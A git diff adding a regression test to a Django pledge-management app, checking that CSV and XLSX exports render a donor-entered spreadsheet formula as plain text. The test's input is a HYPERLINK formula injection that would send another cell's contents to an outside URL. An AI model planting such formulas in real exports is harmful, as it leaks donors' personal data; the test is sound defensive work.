@@ -5,6 +5,7 @@ Logged in as group members, not superusers, except where only a superuser may ac
 
 import csv
 import importlib
+import io
 import re
 
 import pytest
@@ -14,6 +15,7 @@ from django.contrib.auth.models import Group, Permission
 from django.db import connection
 from django.test.utils import CaptureQueriesContext
 from django.urls import reverse
+from openpyxl import load_workbook
 
 from campaigns.models import CampaignPage, Frequency, Pledge
 from nepal_payments import Status
@@ -101,6 +103,26 @@ class TestTheTeam:
         html = client.get(reverse("pledges:index"), {consent: "true"}).content
         assert b"Ram Thapa" in html
         assert b"Sita Sharma" not in html
+
+    # Regression: ISSUE-003 — a pledge "named" =HYPERLINK(…) was exported as a live formula,
+    # which could send other donors' details away when opened. Found by /qa on 2026-10-12.
+    @pytest.mark.parametrize("export", ["csv", "xlsx"])
+    def test_export_shows_a_formula_typed_by_a_donor_as_text(
+        self, client, request, member, sent_pledge, export
+    ):
+        formula = '=HYPERLINK("https://example.org/?d="&F2,"Open your receipt")'
+        sent_pledge.name = formula
+        sent_pledge.save()
+        client.force_login(request.getfixturevalue(member))
+
+        response = client.get(reverse("pledges:index"), {"export": export})
+
+        content = b"".join(response.streaming_content)
+        if export == "csv":
+            assert f"'{formula}".replace('"', '""') in content.decode()
+        else:
+            cells = [cell for row in load_workbook(io.BytesIO(content)).active for cell in row]
+            assert [cell.data_type for cell in cells if cell.value == formula] == ["s"]
 
     def test_export_has_the_message_and_both_consents(self, client, request, member, sent_pledge):
         sent_pledge.message = "In memory of my father, Hari."
